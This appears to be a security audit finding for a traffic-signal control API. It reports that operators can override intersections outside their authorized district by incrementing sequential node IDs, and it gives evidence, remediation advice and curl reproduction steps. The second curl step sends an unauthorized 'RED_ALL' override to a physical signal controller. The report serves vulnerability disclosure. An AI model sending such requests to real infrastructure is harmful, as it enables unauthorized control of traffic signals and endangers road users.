## Findings

1. **BOLA via predictable integer node ID on `POST /api/v3/nodes/{node_id}/override`**: the Node Command Service accepts override commands for any `node_id` without verifying that the target intersection's district matches the caller's `districts_authorized` JWT claim. The graph database Cypher comment (section 5.1) explicitly states: "The Node Command Service currently bypasses checking this relationship." An operator authenticated with `districts_authorized: ["D-NORTH"]` can substitute node ID `45013` (which maps to `D-SOUTH` via `[:LOCATED_IN]` edge) and receive a 202 Accepted response — causing a physical traffic signal change in an unauthorized district.

2. **Intersection node IDs are predictable sequential integers**, enabling trivial enumeration: node `45012` (D-NORTH) and node `45013` (D-SOUTH) differ by 1. The HAR trace confirms the operator discovered this pattern — the second request was sent 95 seconds after the first with `node_id` incremented by 1 — and the system accepted it without boundary validation.

## Evidence

- **HAR entry 1** (authorized, baseline): `POST https://api.metropulse.city/api/v3/nodes/45012/override` at `2026-04-08T18:30:10.115Z`; JWT encodes `sub: usr_operator_09`, `districts_authorized: ["D-NORTH"]`; `x-correlation-id: corr-1122a-3344b`; body `{"override_phase": "GREEN_N_S", "duration_seconds": 120, "reason_code": "EMERGENCY_VEHICLE_ROUTING"}`; response HTTP 202, `{"status": "QUEUED", "node_id": 45012, "estimated_execution_ms": 145}`. Node `45012` belongs to D-NORTH — this request is authorized.

- **HAR entry 2** (unauthorized): `POST https://api.metropulse.city/api/v3/nodes/45013/override` at `2026-04-08T18:31:45.881Z`; same JWT (`districts_authorized: ["D-NORTH"]`); `x-correlation-id: corr-5566c-7788d`; body `{"override_phase": "RED_ALL", "duration_seconds": 300, "reason_code": "MANUAL_TEST"}`; response HTTP 202, `{"status": "QUEUED", "node_id": 45013, "estimated_execution_ms": 152}`. Node `45013` belongs to D-SOUTH per the graph schema — this request was accepted without authorization check.

- **Graph schema confirms district mismatch** (section 5.1): `(i2:Intersection {node_id: 45013})-[:LOCATED_IN]->(d:District {district_id: 'D-SOUTH'})`. The API specification (section 7.1) describes the check that SHOULD execute: a Cypher query to retrieve the intersection's district and compare it against the JWT claim array — but the service bypasses this.

- **Physical consequence**: node `45013` (`hw_serial: node-hw-8822b`) on `Main St` near lat/lon `35.772/-78.641` received a `RED_ALL` for 300 seconds. The cloud KMS-signed MQTT command was dispatched to topic `metropulse/cmd/intersection/node-hw-8822b` — the physical controller only verifies the cryptographic signature, not the operator's district authorization (section 6.1 note: "the edge device does not care about user roles or JWTs. It only verifies the `cryptographic_signature`").

## Reproduction

Step 1 — authorized baseline (confirm the endpoint works for the caller's own district):

```bash
curl -i -X POST "https://api.metropulse.city/api/v3/nodes/45012/override" \
  -H "Authorization: Bearer <JWT_usr_operator_09_D-NORTH>" \
  -H "Content-Type: application/json" \
  -H "x-correlation-id: corr-1122a-3344b" \
  -d '{"override_phase": "GREEN_N_S", "duration_seconds": 120, "reason_code": "EMERGENCY_VEHICLE_ROUTING"}'
```

Expected: HTTP 202, `{"status": "QUEUED", "node_id": 45012}`.

Step 2 — increment node ID to cross district boundary:

```bash
curl -i -X POST "https://api.metropulse.city/api/v3/nodes/45013/override" \
  -H "Authorization: Bearer <JWT_usr_operator_09_D-NORTH>" \
  -H "Content-Type: application/json" \
  -H "x-correlation-id: corr-5566c-7788d" \
  -d '{"override_phase": "RED_ALL", "duration_seconds": 300, "reason_code": "MANUAL_TEST"}'
```

Expected secure outcome: HTTP 403 — node `45013` is in D-SOUTH; caller is only authorized for D-NORTH.  
Observed vulnerable outcome: HTTP 202 `{"status": "QUEUED", "node_id": 45013}` — a KMS-signed MQTT command for `RED_ALL` is dispatched to physical controller `node-hw-8822b` in the South District.

## Remediation

- **Implement the missing Cypher authorization check**: before dispatching the command, execute `MATCH (i:Intersection {node_id: $node_id})-[:LOCATED_IN]->(d:District) RETURN d.district_id` and verify the returned `district_id` is included in the caller's `districts_authorized` JWT claim. If the intersection is not in an authorized district, return HTTP 403.
- **Make node IDs non-predictable**: migrate from sequential integers (`45012`, `45013`) to opaque UUIDs or a hash of `(hw_serial + district_id)` to remove the trivial increment-and-enumerate attack surface.
- **Add district boundary check as a service-level contract**: do not rely solely on the BFF to validate district membership — enforce it as an invariant in the Node Command Service so that direct API calls and internal callers cannot bypass the check.
- **Alert on cross-district command patterns**: flag any sequence where a single `sub` (operator) submits override commands to intersections in multiple distinct districts within a short time window.
